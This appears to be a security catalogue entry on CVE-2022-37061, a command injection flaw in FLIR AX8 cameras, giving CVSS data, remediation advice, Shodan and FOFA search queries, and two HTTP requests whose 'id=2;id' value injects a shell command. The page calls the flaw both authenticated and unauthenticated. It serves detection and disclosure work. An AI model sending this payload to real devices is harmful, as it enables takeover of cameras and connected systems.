---
layout: post
cve_id: CVE-2022-37061
title: FLIR AX8 1.46.16 - Remote Command Injection
pcap: true
pcap_path: /pcaps/2022/CVE-2022-37061.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-37061.yaml
snort2_rule: N/A
snort3_rule: N/A
author: ritikchaddha
severity: critical
impact: 'Authenticated attackers can execute arbitrary OS commands on FLIR AX8 thermal
  imaging cameras through command injection in the alarm functionality''s id parameter,
  potentially gaining complete control over the camera system and connected infrastructure.

  '
remediation: 'Upgrade to the latest version of FLIR AX8 that addresses this vulnerability.
  Implement proper input validation and sanitization for all user-supplied data.

  '
reference:
- https://www.exploit-db.com/exploits/52240
- https://www.flir.com/products/ax8-automation/
- https://nvd.nist.gov/vuln/detail/CVE-2022-37061
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2022-37061
  cwe-id: CWE-78
  epss-score: 0.93519
  epss-percentile: 0.99814
metadata:
  verified: true
  max-request: 1
  vendor: flir
  product: ax8
  shodan-query: title:"FLIR"
  fofa-query: app="FLIR-AX8"
tags:
- cve
- cve2022
- flir
- ax8
- rce
- authenticated
- vkev
- vuln
---

## üîç Vulnerability Description
FLIR AX8 version 1.46.16 and below is susceptible to an unauthenticated remote command injection vulnerability.The vulnerability exists in the alarm functionality where user-supplied input in the 'id' parameter is not properly sanitized,allowing attackers to inject and execute arbitrary OS commands.


## üåê HTTP Request
```nohighlight
POST /login/dologin HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Safari/605.1.15
Connection: close
Content-Length: 37
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
user_name=vxnVOq&user_password=OZip2a
```

```nohighlight
POST /res.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh: Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15
Connection: close
Content-Length: 20
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip
action=alarm&id=2;id
```

